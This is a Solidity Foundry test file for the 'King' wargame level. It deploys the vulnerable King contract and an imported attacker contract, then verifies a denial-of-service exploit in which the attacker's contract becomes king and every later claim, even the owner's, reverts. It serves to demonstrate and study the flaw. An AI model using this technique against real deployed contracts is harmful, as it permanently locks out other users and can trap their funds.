// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {King} from "../src/09-King.sol";
import {KingAttack} from "../src/attackers/KingAttack.sol";

contract KingTest is Test {
    King public king;
    KingAttack public attackerContract;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");
    address public challenger = makeAddr("challenger");

    uint256 public initialPrize = 0.001 ether;

    function setUp() public {
        vm.deal(deployer, 10 ether);
        vm.deal(attacker, 10 ether);
        vm.deal(challenger, 10 ether);

        // Deploy King as deployer with initial prize of 0.001 ether
        vm.prank(deployer);
        king = (new King){value: initialPrize}();

        // Deploy our attacker contract
        vm.prank(attacker);
        attackerContract = new KingAttack();
    }

    function test_InitialKingState() public view {
        assertEq(king._king(), deployer);
        assertEq(king.prize(), initialPrize);
    }

    function test_AttackAndPermanentDenialOfService() public {
        // STEP 1: Attacker seizes the throne
        vm.startPrank(attacker);
        attackerContract.attack{value: initialPrize}(payable(address(king)));
        vm.stopPrank();

        // Verify attacker contract is now the King
        assertEq(king._king(), address(attackerContract), "Attacker failed to become king");

        // STEP 2: Another challenger tries to overthrow the attacker
        vm.startPrank(challenger);

        // Challenger sends 1 ether (way more than the prize).
        // But because attackerContract reverts on receive(),
        // the call to king.receive() MUST REVERT!
        (bool success,) = address(king).call{value: 1 ether}("");
        assertFalse(success, "King was successfully overthrown! DoS failed!");

        vm.stopPrank();

        // STEP 3: Even the owner cannot reclaim the throne!
        vm.startPrank(deployer);
        (bool ownerSuccess,) = address(king).call{value: 2 ether}("");
        assertFalse(ownerSuccess, "Owner was able to reclaim the throne! DoS failed!");
        vm.stopPrank();

        // Verification: Attacker contract is STILL King!
        assertEq(king._king(), address(attackerContract));
        console2.log("Local PoC Success: Attacker contract is permanently King!");
    }
}
